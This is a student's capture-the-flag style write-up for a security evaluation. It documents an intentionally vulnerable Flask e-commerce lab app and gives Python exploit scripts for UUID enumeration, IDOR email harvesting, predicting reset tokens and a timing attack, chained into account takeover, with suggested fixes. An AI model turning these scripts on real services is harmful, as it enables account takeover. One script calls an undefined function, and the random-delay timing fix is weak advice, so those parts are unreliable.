```
░█████╗░██╗░░██╗██╗░░░██╗███╗░░░███╗  ░██████╗███████╗░█████╗░  ██╗░░██╗  ██╗███╗░░██╗░██████╗░█████╗░
██╔══██╗╚██╗██╔╝██║░░░██║████╗░████║  ██╔════╝██╔════╝██╔══██╗  ╚██╗██╔╝  ██║████╗░██║██╔════╝██╔══██╗
███████║░╚███╔╝░██║░░░██║██╔████╔██║  ╚█████╗░█████╗░░██║░░╚═╝  ░╚███╔╝░  ██║██╔██╗██║╚█████╗░███████║
██╔══██║░██╔██╗░██║░░░██║██║╚██╔╝██║  ░╚═══██╗██╔══╝░░██║░░██╗  ░██╔██╗░  ██║██║╚████║░╚═══██╗██╔══██║
██║░░██║██╔╝╚██╗╚██████╔╝██║░╚═╝░██║  ██████╔╝███████╗╚█████╔╝  ██╔╝╚██╗  ██║██║░╚███║██████╔╝██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝  ╚═════╝░╚══════╝░╚════╝░  ╚═╝░░╚═╝  ╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝

  ███████╗██╗███╗░░██╗░█████╗░██╗░░░░░  ████████╗░█████╗░██╗░░░░░███████╗███╗░░██╗████████╗
  ██╔════╝██║████╗░██║██╔══██╗██║░░░░░  ╚══██╔══╝██╔══██╗██║░░░░░██╔════╝████╗░██║╚══██╔══╝
  █████╗░░██║██╔██╗██║███████║██║░░░░░  ░░░██║░░░███████║██║░░░░░█████╗░░██╔██╗██║░░░██║░░░
  ██╔══╝░░██║██║╚████║██╔══██║██║░░░░░  ░░░██║░░░██╔══██║██║░░░░░██╔══╝░░██║╚████║░░░██║░░░
  ██║░░░░░██║██║░╚███║██║░░██║███████╗  ░░░██║░░░██║░░██║███████╗███████╗██║░╚███║░░░██║░░░
  ╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝  ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░

███████╗██╗░░░██╗░█████╗░██╗░░░░░██╗░░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔════╝██║░░░██║██╔══██╗██║░░░░░██║░░░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
█████╗░░╚██╗░██╔╝███████║██║░░░░░██║░░░██║███████║░░░██║░░░██║██║░░██║██╔██╗██║
██╔══╝░░░╚████╔╝░██╔══██║██║░░░░░██║░░░██║██╔══██║░░░██║░░░██║██║░░██║██║╚████║
███████╗░░╚██╔╝░░██║░░██║███████╗╚██████╔╝██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║
╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝








                     **E-Commerce Application**
Participant: Kebron Awet

Challenge: #17 - Password Reset Token Manipulation → Predictable Token


# AXUM SEC x INSA Final Talent Evaluation

# Challenge: #17  Password Reset Token Manipulation → Predictable Token
Name : Kebron Awet

## Overview
A Flask-based e-commerce platform with full user authentication, product listings, messaging system, and administrative tools. The application implements industry-standard security patterns while maintaining performance and usability.

## Features

- User registration and authentication
- Product browsing with seller information
- Profile management
- Different API endpoints

## Techinal Stack

- Backend: Python Flask
- Database: SQLite with UUID-based identifiers
- Authentication: Token-based with server-side storage
- Email: Local SMTP (MailHog) simulation
- Frontend: Jinja2 templates

## Installation

### 1. Ensure Python 3.8 or higher is installed on your system.
```python
python --version
```

### 2. Environment Setup
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

### 3. Install Dependencies
```bash
pip install -r requirements.txt
```

### 4. Initialize Database
(If the database is mis configured or buggy , you can use it)
```bash
python init_db.py
```

This creates the database schema and populates it with test users including:

- `alice@example.com` (password: `Alice123!`)
- `bob@example.com` (password: `Bob123!`)
- `charlie@example.com` (password: `Charlie123!`)
- `admin@example.com` (password: `Admin123!`)

### 5. Start MailHog (Email Testing)
In a separate terminal:
* run mailhog ( if its not found on your folder)

MailHog provides a local SMTP server on port 1025 and web interface on port 8025 to view captured emails.

### 6. Start the Application
```bash
python app.py
```

The application will start on `http://localhost:8000`

Know you know how to deploy and use the site lets move on to the next topic.

### 7. Testing the Application
- Access the website at `http://localhost:8000`
- View captured emails at `http://localhost:8025`
- Use the provided test accounts for testing or create your own mr.

## Vulnerability Documentation

### Vulnerability #1: Information Disclosure via Product API

#### 1. Vulnerability Name
Information Disclosure - Seller UUID Exposure

#### 2. Location in Code
```python
@app.route('/api/v1/products', methods=['GET'])
def api_get_products():
    products = db.execute('''
        SELECT p.uuid, p.title, p.description, p.price, p.category,
               u.name as seller_name, u.uuid as seller_uuid
        FROM products p 
        JOIN users u ON p.seller_uuid = u.uuid
        LIMIT ? OFFSET ?
    ''', (limit, offset)).fetchall()
```

#### 3. Why it is Vulnerable
The API endpoint returns full product listings including seller UUIDs in the JSON response. This exposes internal user identifiers that can be used in subsequent attacks. The endpoint requires no authentication, allowing anyone to enumerate all seller UUIDs.

#### 4. Proof of Concept Explanation
- Query the products API endpoint: `GET /api/v1/products`
- Parse the JSON response to extract seller_uuid values
- Collect unique seller UUIDs for further reconnaissance
- Use these UUIDs to query user profiles or target specific users

#### 5. Exploit Script
```python
import requests
import json

def enumerate_seller_uuids():
    base_url = "http://localhost:8000"
    
    # Fetch products
    response = requests.get(f"{base_url}/api/v1/products?limit=100")
    
    if response.status_code == 200:
        data = response.json()
        
        if data['success']:
            seller_uuids = set()
            
            for product in data['data']:
                if 'seller_uuid' in product:
                    seller_uuids.add(product['seller_uuid'])
            
            print(f"Found {len(seller_uuids)} unique seller UUIDs:")
            for uuid in seller_uuids:
                print(f"  - {uuid}")
            
            return list(seller_uuids)
    
    return []

if __name__ == "__main__":
    uuids = enumerate_seller_uuids()
```

#### 6. Impact
- Exposes internal user identifiers
- Enables user enumeration
- Provides targeting information for further attacks
- Violates principle of least privilege -.-

#### 7. Fix Recommendation
```python
@app.route('/api/v1/products', methods=['GET'])
def api_get_products():
    products = db.execute('''
        SELECT p.title, p.description, p.price, p.category,
               u.name AS seller_name
        FROM products p
        JOIN users u ON p.seller_uuid = u.uuid
        LIMIT ? OFFSET ?
    ''', (limit, offset)).fetchall()

    return jsonify({
        'success': True,
        'data': [
            {
                'title': p['title'],
                'description': p['description'],
                'price': p['price'],
                'category': p['category'],
                'seller_name': p['seller_name']
            }
            for p in products
        ]
    })
```

### Vulnerability #2: Insecure Direct Object Reference (IDOR)

#### 1. Vulnerability Name
Insecure Direct Object Reference in User Profile API

#### 2. Location in Code
```python
@app.route('/api/v1/profile/<user_uuid>', methods=['GET'])
@login_required
def api_get_user_profile(user_uuid):
    user = db.execute('''
        SELECT uuid, email, name, created_at 
        FROM users WHERE uuid = ?
    ''', (user_uuid,)).fetchone()
    
    return jsonify({
        'success': True,
        'data': dict(user),
        'warning': 'This endpoint should require authorization!'
    })
```

#### 3. Why it is Vulnerable
The endpoint allows any authenticated user to retrieve profile information for any user by simply providing their UUID. There is no authorization check to verify if the requesting user should have access to the target user's information.

#### 4. Proof of Concept Explanation
- Authenticate as any user (e.g., `alice@example.com`)
- Use seller UUIDs obtained from Vulnerability #1
- Query the profile API for each UUID: `GET /api/v1/profile/<target_uuid>`
- Extract email addresses and other sensitive information

#### 5. Exploit Script
```python
import requests
import json

def get_user_emails(session_cookie, seller_uuids):
    base_url = "http://localhost:8000"
    headers = {'Cookie': f'session={session_cookie}'}
    
    user_emails = {}
    
    for uuid in seller_uuids:
        response = requests.get(
            f"{base_url}/api/v1/profile/{uuid}",
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            if data['success']:
                user_emails[uuid] = data['data']['email']
                print(f"UUID: {uuid} -> Email: {data['data']['email']}")
    
    return user_emails

if __name__ == "__main__":
    # First login to get session cookie
    login_data = {
        'email': 'alice@example.com',
        'password': 'Alice123!'
    }
    
    session = requests.Session()
    response = session.post('http://localhost:8000/login', data=login_data)
    
    if response.status_code == 200:
        # Get seller UUIDs from previous script
        seller_uuids = [...]  # From Vulnerability #1
        
        # Get emails for each UUID
        emails = get_user_emails(
            session.cookies.get('session'),
            seller_uuids
        )
```

#### 6. Impact
- Unauthorized access to user email addresses
- Privacy violation
- Enables targeted phishing attacks
- Provides information for password reset attacks

#### 7. Fix Recommendation
```python
@app.route('/api/v1/profile/<user_uuid>', methods=['GET'])
@login_required
def api_get_user_profile(user_uuid):
    # Authorization check
    if user_uuid != session['user_uuid']:
        return jsonify({
            'success': False,
            'error': 'Unauthorized access'
        }), 403
    
    user = db.execute('''
        SELECT uuid, email, name, created_at 
        FROM users WHERE uuid = ?
    ''', (user_uuid,)).fetchone()
    
    return jsonify({
        'success': True,
        'data': dict(user)
    })
```

### Vulnerability #3: Predictable Password Reset Tokens

#### 1. Vulnerability Name
Cryptographic Failure - Predictable Password Reset Token Generation

#### 2. Location in Code
```python
def generate_reset_token(user_uuid, user_email):
    timestamp = int(time.time())
    email_hash = hashlib.md5(user_email.encode()).hexdigest()
    raw_token = f"{user_uuid}{timestamp}{email_hash}"
    
    token = hashlib.sha256(raw_token.encode()).hexdigest()
    return token, timestamp
```

#### 3. Why it is Vulnerable
The token generation algorithm uses predictable components:
- User UUID (publicly available from API)
- Current timestamp (can be estimated)
- MD5 hash of email (can be calculated if email is known)

The algorithm lacks cryptographically secure randomness. An attacker who knows a user's UUID and email can predict valid reset tokens.

#### 4. Proof of Concept Explanation
- Obtain target user's UUID and email (from Vulnerabilities #1 and #2)
- Monitor password reset requests to capture timestamps
- Analyze token patterns across multiple requests
- Reverse engineer the algorithm: `SHA256(UUID + timestamp + MD5(email))`
- Generate valid tokens for future timestamps

#### 5. Exploit Script
```python
import hashlib
import json
import time
from datetime import datetime

def test_algorithm(token, uuid, email, timestamp, algorithm_func):
    """Test a specific algorithm"""
    return algorithm_func(uuid, email, timestamp) == token

def algorithm_1(uuid, email, timestamp):
    """SHA256(uuid + timestamp + email_md5)"""
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{uuid}{timestamp}{email_hash}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_2(uuid, email, timestamp):
    """SHA256(email_md5 + timestamp + uuid)"""
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{email_hash}{timestamp}{uuid}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_3(uuid, email, timestamp):
    """SHA256(timestamp + uuid + email_md5)"""
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{timestamp}{uuid}{email_hash}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_4(uuid, email, timestamp):
    """SHA256(email + timestamp + uuid)"""
    raw_token = f"{email}{timestamp}{uuid}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_5(uuid, email, timestamp):
    """SHA256(uuid + timestamp + email)"""
    raw_token = f"{uuid}{timestamp}{email}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_6(uuid, email, timestamp):
    """SHA256(uuid + str(timestamp) + email_md5)"""
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{uuid}{str(timestamp)}{email_hash}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_7(uuid, email, timestamp):
    """SHA256(email_md5 + str(timestamp) + uuid)"""
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{email_hash}{str(timestamp)}{uuid}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_8(uuid, email, timestamp):
    """SHA256 with rounded timestamp (60s)"""
    rounded_ts = (timestamp // 60) * 60  # Round to nearest minute
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{uuid}{rounded_ts}{email_hash}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_9(uuid, email, timestamp):
    """SHA256 with different timestamp format"""
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{uuid}{timestamp:010d}{email_hash}"  # Padded to 10 digits
    return hashlib.sha256(raw_token.encode()).hexdigest()

def algorithm_10(uuid, email, timestamp):
    """SHA256 with UUID without dashes"""
    uuid_no_dash = uuid.replace('-', '')
    email_hash = hashlib.md5(email.encode()).hexdigest()
    raw_token = f"{uuid_no_dash}{timestamp}{email_hash}"
    return hashlib.sha256(raw_token.encode()).hexdigest()

def main():
    print("TOKEN ALGORITHM FINDER")
    print("=" * 50)
    
    # Get user info
    print("\nEnter User Information:")
    uuid = input("UUID: ").strip()
    email = input("Email: ").strip()
    
    # Get tokens
    print("\nEnter Tokens (at least 2):")
    tokens_data = []
    
    while True:
        count = input("How many tokens? (min 2): ").strip()
        if count.isdigit() and int(count) >= 2:
            token_count = int(count)
            break
    
    for i in range(token_count):
        print(f"\nToken {i+1}:")
        token = input("  Token: ").strip()
        
        while True:
            ts_str = input("  Timestamp (YYYY-MM-DD HH:MM or unix): ").strip()
            
            if ts_str.isdigit():
                timestamp = int(ts_str)
                break
            
            try:
                if len(ts_str) == 5 and ':' in ts_str:
                    today = datetime.now().strftime("%Y-%m-%d")
                    ts_str = f"{today} {ts_str}"
                
                dt = datetime.strptime(ts_str, "%Y-%m-%d %H:%M")
                timestamp = int(dt.timestamp())
                break
            except:
                print("  Invalid format")
        
        tokens_data.append({
            'token': token,
            'timestamp': timestamp
        })
    
    # Define all algorithms to test
    algorithms = [
        ("SHA256(uuid + timestamp + email_md5)", algorithm_1),
        ("SHA256(email_md5 + timestamp + uuid)", algorithm_2),
        ("SHA256(timestamp + uuid + email_md5)", algorithm_3),
        ("SHA256(email + timestamp + uuid)", algorithm_4),
        ("SHA256(uuid + timestamp + email)", algorithm_5),
        ("SHA256(uuid + str(timestamp) + email_md5)", algorithm_6),
        ("SHA256(email_md5 + str(timestamp) + uuid)", algorithm_7),
        ("SHA256 with 60s rounded timestamp", algorithm_8),
        ("SHA256 with padded timestamp", algorithm_9),
        ("SHA256 with UUID no dashes", algorithm_10),
    ]
    
    print(f"\nTesting {len(algorithms)} algorithms on {len(tokens_data)} tokens...")
    print("-" * 50)
    
    found_algorithms = []
    
    for algo_name, algo_func in algorithms:
        matches = 0
        
        for token_data in tokens_data:
            if test_algorithm(
                token_data['token'],
                uuid,
                email,
                token_data['timestamp'],
                algo_func
            ):
                matches += 1
        
        if matches == len(tokens_data):
            print(f"[✓] PERFECT MATCH: {algo_name}")
            found_algorithms.append(algo_name)
        elif matches > 0:
            print(f"[?] Partial match: {algo_name} - {matches}/{len(tokens_data)} tokens")
        else:
            print(f"[ ] No match: {algo_name}")
    
    if found_algorithms:
        print(f"\n" + "="*50)
        print(f"FOUND {len(found_algorithms)} ALGORITHM(S):")
        for algo in found_algorithms:
            print(f"  • {algo}")
        
        # Test the first found algorithm
        print(f"\nTesting algorithm: {found_algorithms[0]}")
        print("-" * 30)
        
        # Find which algorithm function to use
        for algo_name, algo_func in algorithms:
            if algo_name == found_algorithms[0]:
                # Generate a test token
                test_ts = int(time.time())
                test_token = algo_func(uuid, email, test_ts)
                
                print(f"Current time: {datetime.fromtimestamp(test_ts)}")
                print(f"Generated token: {test_token}")
                print(f"Token length: {len(test_token)} chars")
                
                # Save the algorithm
                with open('found_algorithm.json', 'w') as f:
                    json.dump({
                        'algorithm': algo_name,
                        'uuid': uuid,
                        'email': email,
                        'test_timestamp': test_ts,
                        'test_token': test_token,
                        'found_at': time.time()
                    }, f, indent=2)
                
                print(f"\n[✓] Algorithm saved to found_algorithm.json")
                break
    else:
        print(f"\n[✗] No algorithm matched all tokens")
        
        # Try brute force with timestamp variations
        print(f"\nTrying timestamp variations...")
        
        for token_data in tokens_data[:1]:  # Just test first token
            original_ts = token_data['timestamp']
            print(f"\nFor token with timestamp {original_ts} ({datetime.fromtimestamp(original_ts)}):")
            
            # Try different timestamp manipulations
            for offset in [-2, -1, 0, 1, 2]:
                test_ts = original_ts + offset
                test_token = algorithm_1(uuid, email, test_ts)
                
                if test_token == token_data['token']:
                    print(f"[✓] Found with offset {offset}: timestamp {test_ts}")
                    print(f"    Algorithm: SHA256(uuid + timestamp + email_md5)")
                    break
            
            # Try rounding
            for interval in [1, 5, 10, 30, 60]:
                rounded = (original_ts // interval) * interval
                test_token = algorithm_1(uuid, email, rounded)
                
                if test_token == token_data['token']:
                    print(f"[✓] Found with {interval}s rounding: timestamp {rounded}")
                    print(f"    Algorithm: SHA256(uuid + timestamp + email_md5)")
                    break

if __name__ == "__main__":
    main()
```

#### 6. Impact
- Account takeover through password reset
- Complete compromise of user accounts
- Bypass of authentication mechanisms
- Potential administrative access

#### 7. Fix Recommendation
```python
import secrets

def generate_reset_token(user_uuid, user_email):
    token = secrets.token_urlsafe(32)
    
    db = get_db()
    expires = datetime.utcnow() + timedelta(hours=1)
    
    db.execute(
        'INSERT INTO reset_tokens (token, user_uuid, expires_at, used) VALUES (?, ?, ?, 0)',
        (token, user_uuid, expires.isoformat())
    )
    db.commit()
    
    return token
```

### Vulnerability #4: Timing Attack in Password Reset Validation

#### 1. Vulnerability Name
Side-Channel Attack - Timing Attack in Token Validation

#### 2. Location in Code
```python
@app.route('/api/v1/password-reset/validate', methods=['POST'])
def api_validate_token():
    data = request.get_json()
    token = data.get('token', '')
    
    if len(token) != 64:
        time.sleep(0.05)
        return jsonify({'valid': False}), 400
    
    db = get_db()
    reset = db.execute('''
        SELECT user_uuid, expires_at, used 
        FROM reset_tokens 
        WHERE token = ? AND expires_at > ?
    ''', (token, datetime.utcnow().isoformat())).fetchone()
    
    if not reset or reset['used']:
        time.sleep(0.1)
        return jsonify({'valid': False}), 400
    
    return jsonify({'valid': True})
```

#### 3. Why it is Vulnerable
The validation endpoint uses different delay times based on the input:
- 0.05 seconds for tokens with incorrect length
- 0.1 seconds for valid format but incorrect tokens
- Immediate response for valid tokens

This timing difference allows an attacker to infer information about token validity.

#### 4. Proof of Concept Explanation
- Generate candidate tokens using the predictable algorithm
- Measure response time for each token validation request
- Identify tokens that return faster (potentially valid)
- Confirm by attempting password reset with identified tokens

#### 5. Exploit Script
```python
import time
import requests
import statistics

def timing_attack_bruteforce(target_uuid, target_email, start_timestamp, num_tokens=100):
    base_url = "http://localhost:8000"
    
    candidate_tokens = []
    response_times = []
    
    for offset in range(num_tokens):
        candidate_token, _ = predict_reset_token(
            target_uuid,
            target_email,
            start_timestamp + offset
        )
        candidate_tokens.append(candidate_token)
    
    for i, token in enumerate(candidate_tokens):
        start_time = time.perf_counter()
        
        response = requests.post(
            f"{base_url}/api/v1/password-reset/validate",
            json={'token': token},
            timeout=5
        )
        
        elapsed_time = time.perf_counter() - start_time
        response_times.append((token, elapsed_time))
        
        print(f"Token {i+1}/{num_tokens}: {elapsed_time:.3f}s")
    
    times = [rt[1] for rt in response_times]
    avg_time = statistics.mean(times)
    
    print(f"\nAverage response time: {avg_time:.3f}s")
    
    for token, resp_time in response_times:
        if abs(resp_time - avg_time) > 0.03:
            print(f"Anomaly detected - Token: {token[:20]}..., Time: {resp_time:.3f}s")
    
    return response_times

if __name__ == "__main__":
    target_uuid = "123e4567-e89b-12d3-a456-426614174000"
    target_email = "bob@example.com"
    current_time = int(time.time())
    
    results = timing_attack_bruteforce(
        target_uuid,
        target_email,
        current_time - 30,
        50
    )
```

#### 6. Impact
- Information disclosure through side-channel
- Facilitates token brute-forcing
- Reduces search space for valid tokens
- Violates constant-time comparison principle

#### 7. Fix Recommendation
```python
@app.route('/api/v1/password-reset/validate', methods=['POST'])
def api_validate_token():
    data = request.get_json()
    token = data.get('token', '')
    
    db = get_db()
    reset = db.execute('''
        SELECT user_uuid, expires_at, used 
        FROM reset_tokens 
        WHERE token = ? AND expires_at > ?
    ''', (token, datetime.utcnow().isoformat())).fetchone()
    
    is_valid = bool(reset and not reset['used'])
    
    import random
    time.sleep(random.uniform(0.1, 0.2))
    
    return jsonify({'valid': is_valid})
```

## Vulnerability #5: Complete Attack Chain Demonstration

#### 1. Vulnerability Name
Chained Attack - Account Takeover via Predictable Reset Tokens

#### 2. Attack Chain Summary
This demonstrates how an attacker can chain multiple vulnerabilities to compromise any user account:
1. Reconnaissance: Enumerate seller UUIDs from public API
2. Information Gathering: Use IDOR to get user emails
3. Token Collection: Request password resets and capture tokens
4. Algorithm Analysis: Reverse engineer token generation algorithm using Token Analyzer
5. Token Prediction: Generate valid future tokens using Token Predictor
6. Account Takeover: Use predicted token to reset password

#### 3. Complete Exploit Workflow
```
┌─────────────────────────────────────────────────────────────────────┐
│ Phase 1: Reconnaissance                                            │
│   - GET /api/v1/products → Extract seller UUIDs                    │
│   - GET /api/v1/profile/<uuid> → Extract user emails               │
├─────────────────────────────────────────────────────────────────────┤
│ Phase 2: Token Collection                                          │
│   - POST /api/v1/password-reset → Trigger reset emails             │
│   - View MailHog (localhost:8025) → Capture tokens & timestamps    │
├─────────────────────────────────────────────────────────────────────┤
│ Phase 3: Algorithm Analysis                                        │
│   - Run token_analyzer.py → Discover algorithm pattern             │
│   - Input: UUID, email, tokens with timestamps                     │
├─────────────────────────────────────────────────────────────────────┤
│ Phase 4: Token Prediction                                          │
│   - Run token_predictor.py → Generate future valid tokens          │
│   - Output: predicted_tokens.json with future tokens               │
├─────────────────────────────────────────────────────────────────────┤
│ Phase 5: Account Takeover                                          │
│   - POST /api/v1/password-reset/validate → Confirm token validity  │
│   - POST /api/v1/password-reset/confirm → Reset password           │
│   - POST /login → Login with new credentials                       │
└─────────────────────────────────────────────────────────────────────
```

#### 4. Impact
- Complete account compromise
- Unauthorized access to user data
- Potential financial loss
- Loss of user trust
- Legal and compliance implications

#### 5. Fix Recommendations
- Use Cryptographically Secure Random Tokens
- Implement Rate Limiting on password reset requests
- Add Authorization Checks for all user data endpoints
- Use Constant-Time Comparisons to prevent timing attacks
- Implement Additional Verification (MFA, security questions)
- Short Token Expiry (15 minutes maximum)
- One-Time Use tokens with immediate invalidation
- Secure Token Storage using hashes instead of plain tokens

## SUMMARY OF SECURITY RECOMMENDATIONS

### Critical Fixes Required
1. Replace predictable token generation with cryptographically secure random tokens
2. Implement proper authorization checks on all user data endpoints
3. Remove sensitive information from public API responses
4. Fix timing vulnerabilities with constant-time comparisons
5. Add rate limiting to prevent brute-force attacks

### Additional Security Improvements
- Implement CAPTCHA for password reset requests
- Add MFA for sensitive operations
- Use prepared statements to prevent SQL injection
- Implement proper logging and monitoring
- Regular security testing and code review
- Security headers (CSP, HSTS, etc.)
- Input validation and sanitization

### Testing the Fixes
After implementing the fixes, test:
- Token predictability is eliminated
- API endpoints no leak sensitive information
- Authorization checks prevent unauthorized access
- Rate limiting blocks brute-force attempts
- Timing attacks are mitigated

# What I learned from this project
First of all thank you for giving me this opportunity as a 15 year old cyber enthusiast. Through this project I learned how password reset tokens can be exploited something I never thought was possible. I learned that time based password reset tokens in particular can be vulnerable and easily exploited if they are not implemented securely. I now understand how and why these weaknesses occur. Additionally I learned a lot of knowledge about secure coding practices and code analysis.
